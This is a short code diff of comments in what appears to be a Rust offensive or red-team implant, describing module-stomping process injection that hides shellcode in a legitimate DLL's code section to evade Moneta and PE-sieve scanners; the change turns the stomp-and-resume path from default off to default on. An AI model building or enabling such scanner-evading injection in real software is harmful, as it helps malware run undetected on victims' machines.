@@ -279,9 +279,11 @@ impl MemoryMaskKit for LiveMemoryMask {
 // `crate::inject::module_stomp`. Module stomping makes the injected shellcode
 // disk-backed + RX (a stomped legit DLL's .text) instead of unbacked RWX, so
 // Moneta exec-private / PE-sieve unbacked-memory checks pass. The actual
-// stomp+resume is gated (`inject::modulestomp_enabled`, default OFF) — the
-// data path (CreateProcessW suspended) always runs so it's verifiable, but the
-// cross-process write+execute waits for target-side validation.
+// stomp+resume is gated (`inject::modulestomp_enabled`, default **ON**) — the
+// full module-stomping path runs (spawn suspended → stomp `.text` → resume).
+// `set_modulestomp_enabled(false)` collapses it to a verifiable data path
+// (CreateProcessW suspended, no cross-process execute) for targets that forbid
+// cross-process injection.
 
 /// Live process injector: module stomping. See [`crate::inject`] for the
 /// technique + why the execution tail is gated.
